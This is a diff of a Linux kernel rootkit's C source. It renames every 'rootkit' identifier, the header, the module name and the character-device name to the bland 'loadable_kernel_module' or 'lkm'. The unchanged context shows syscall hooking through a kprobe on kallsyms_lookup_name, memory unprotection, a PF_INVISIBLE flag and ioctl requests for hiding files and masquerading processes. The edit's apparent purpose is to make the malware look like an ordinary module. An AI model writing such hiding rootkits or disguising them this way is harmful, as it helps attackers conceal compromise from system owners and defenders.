@@ -14,7 +14,7 @@
 #include <linux/fdtable.h>
 #include <linux/proc_ns.h>
 
-#include "rootkit.h"
+#include "loadable_kernel_module.h"
 
 // kprobe for kallsyms_lookup_name
 #include <linux/kprobes.h>
@@ -22,7 +22,7 @@ static struct kprobe kp = {
 	    .symbol_name = "kallsyms_lookup_name"
 };
 
-#define OURMODNAME "rootkit"
+#define OURMODNAME "loadable_kernel_module"
 #define PF_INVISIBLE 0x10000000
 
 MODULE_AUTHOR("Harry Hsu x90613@gmail.com");
@@ -232,19 +232,19 @@ static int hook(void)
 
 /*  --------------------------------------------------  */
 
-static int rootkit_open(struct inode *inode, struct file *filp)
+static int lkm_open(struct inode *inode, struct file *filp)
 {
 	printk(KERN_INFO "%s\n", __func__);
 	return 0;
 }
 
-static int rootkit_release(struct inode *inode, struct file *filp)
+static int lkm_release(struct inode *inode, struct file *filp)
 {
 	printk(KERN_INFO "%s\n", __func__);
 	return 0;
 }
 
-static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
+static long lkm_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
 {
 	struct hided_file file_info;
 	struct masq_proc_req user_req;
@@ -306,13 +306,13 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long a
 
 /* File operations structure */
 struct file_operations fops = {
-	.open = rootkit_open,
-	.unlocked_ioctl = rootkit_ioctl,
-	.release = rootkit_release,
+	.open = lkm_open,
+	.unlocked_ioctl = lkm_ioctl,
+	.release = lkm_release,
 	.owner = THIS_MODULE,
 };
 
-static int __init rootkit_init(void)
+static int __init lkm_init(void)
 {
 	int ret;
 	dev_t dev_no, dev;
@@ -323,7 +323,7 @@ static int __init rootkit_init(void)
 	kernel_cdev->owner = THIS_MODULE;
 
 	/* Dynamically allocate a character device region */
-	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
+	ret = alloc_chrdev_region(&dev_no, 0, 1, "loadable_kernel_module");
 	if (ret < 0) {
 		pr_info("major number allocation failed\n");
 		return ret;
@@ -359,7 +359,7 @@ static int __init rootkit_init(void)
 	return 0;
 }
 
-static void __exit rootkit_exit(void)
+static void __exit lkm_exit(void)
 {
 	// Unhook syscall
 	unprotect_memory();
@@ -375,5 +375,5 @@ static void __exit rootkit_exit(void)
 	unregister_chrdev_region(major, 1);
 }
 
-module_init(rootkit_init);
-module_exit(rootkit_exit);
+module_init(lkm_init);
+module_exit(lkm_exit);
